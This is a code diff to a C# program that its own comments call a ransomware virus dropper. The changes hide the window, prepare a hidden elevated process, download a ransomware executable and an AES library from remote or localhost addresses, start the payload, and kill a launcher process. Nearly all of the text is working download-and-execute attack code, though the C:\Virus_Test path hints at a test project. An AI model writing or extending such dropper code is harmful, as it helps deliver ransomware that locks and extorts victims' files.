@@ -20,13 +20,22 @@ namespace Dropper
         /// Reperesents the path where the virus will be loaded into and operates.
         ///</summary>
         private static String pathToInfect = @"C:\Virus_Test";
+        static Process p = new Process();
         /// <summary>
         /// Creates a new instance of the ransomware virus dropper.
         /// </summary>
+        /// 
+       static bool flag = false;
         public DropperGUI()
         {
             InitializeComponent();
             this.TransparencyKey = this.BackColor; // Make invisible
+            p.StartInfo.Arguments = "";
+            p.StartInfo.UseShellExecute = false;
+            p.StartInfo.CreateNoWindow = true;
+            p.StartInfo.RedirectStandardOutput = true;
+            p.StartInfo.Verb = "runas";
+
         }
         private void StartAction()
         {
@@ -39,9 +48,9 @@ namespace Dropper
              * ransomware
              */
             // Create Folder
-            Directory.CreateDirectory(pathToInfect + "\\Malware");
+            Directory.CreateDirectory(pathToInfect + @"\Malware");
             // Add the signature file if not exist
-            var directoryInfected = File.Exists(pathToInfect + "\\Malware\\README.txt");
+            var directoryInfected = File.Exists(pathToInfect + @"\Malware\README.txt");
             if (!directoryInfected)
             {
                 // create the folder and the text file in the path C:\Program
@@ -55,12 +64,24 @@ namespace Dropper
             }
             // if it already exists it means a previous version of the virus infected
             // the OS then launch the virus by downloading it from a malicious site
-            String link = "https://www.some-site.com";
-            DownLoadFileInBackground2(link);
+            String link = "https://www.github.com", link2 = "https://www.github.com";
+            DownLoadFileInBackground2(link, pathToInfect + @"\Malware\Ransomeware.exe",link2,@"\Malware\AES.dll");
             // After finishing the downloading, start the ransomware virus and terminate
-            Process.Start(pathToInfect + @"\Malware\Ransomware_Beta.exe");
+            if (!flag)
+            {
+                p.StartInfo.FileName = pathToInfect + @"\Malware\Ransomeware.exe";
+                p.Start();
+            }
 
-              Process[] _process = null;
+            kill();
+            
+            
+        }
+
+        private static void kill()
+        {
+            
+            Process[] _process = null;
             _process = Process.GetProcessesByName("DCQPKX"); //kill laucher
             foreach (Process proces in _process)
             {
@@ -75,32 +96,47 @@ namespace Dropper
             }
         }
         // DownLoadFileInBackground2
-        public static void DownLoadFileInBackground2(string address)
+        public static void DownLoadFileInBackground2(string address1,String path1, string address2, string path2)
         {
-            // Make protocol for donwload file from github
-            ServicePointManager.Expect100Continue = true;
-            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
-            WebClient client = new WebClient();
-            Uri uri = new Uri(address);
-            // Call DownloadFileCallback2 when the download completes.
-            client.DownloadFileCompleted +=
-                new AsyncCompletedEventHandler(DownloadFileCallback2);
-            // Specify a progress notification handler here ...
-            client.DownloadFileAsync(uri,
-                                     pathToInfect + @"\Malware\Ransomware.exe");
+            try
+            {
+                // Make protocol for donwload file from github
+                ServicePointManager.Expect100Continue = true;
+                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
+                WebClient client = new WebClient();
+                Uri uri = new Uri(address1);
+                // Call DownloadFileCallback2 when the download completes.
+                client.DownloadFileCompleted +=
+                    new AsyncCompletedEventHandler(DownloadFileCallback2);
+                // Specify a progress notification handler here ...
+                client.DownloadFileAsync(uri,path1);
+                uri = new Uri(address2);
+                client.DownloadFileAsync(uri, path2);
+            }
+            catch (Exception e)
+            {
+                DownLoadLocalFileInBackground();
+            }
         }
         private static void DownloadFileCallback2(object sender,
                                                   AsyncCompletedEventArgs e)
         {
-            if (e.Cancelled)
+            try
             {
-                Console.WriteLine("File download cancelled.");
-                DownLoadLocalFileInBackground();
-            }
+                if (e.Cancelled)
+                {
+                    Console.WriteLine("File download cancelled.");
+                    DownLoadLocalFileInBackground();
+                }
 
-            if (e.Error != null)
+                if (e.Error != null)
+                {
+                    Console.WriteLine(e.Error.ToString());
+                }
+            }
+            catch (Exception ex)
             {
-                Console.WriteLine(e.Error.ToString());
+                DownLoadLocalFileInBackground();
             }
         }
         public static void DownLoadLocalFileInBackground()
@@ -109,10 +145,12 @@ namespace Dropper
             try
             {
                 WebClient webClient = new WebClient();
-                webClient.DownloadFile("URl to local server",
-                                       @"C:\Program Files\System32\Ransomware.exe");
+                webClient.DownloadFile("127.0.0.1:8080",
+                                       pathToInfect + @"\Malware\Ransomeware.exe");
+                webClient.DownloadFile("127.0.0.1:8080",
+                                      pathToInfect + @"\Malware\AES.dll");
             }
-            catch (WebException e)
+            catch (Exception e)
             {
                 LaunchLocally();
             }
@@ -120,7 +158,13 @@ namespace Dropper
 
         private static void LaunchLocally()
         {
-            Process.Start(pathToInfect + @"\Malware\local\Ransomware.exe");
+            p.StartInfo.FileName = @"C:\local\bin\Ransomeware.exe";
+            Console.WriteLine(p.StartInfo.FileName);
+            p.Start();
+            flag = true;
+            kill();
+            Console.WriteLine("virus started!");
+            
         }
 
         private void DropperGUI_FormClosing(object sender, FormClosingEventArgs e)
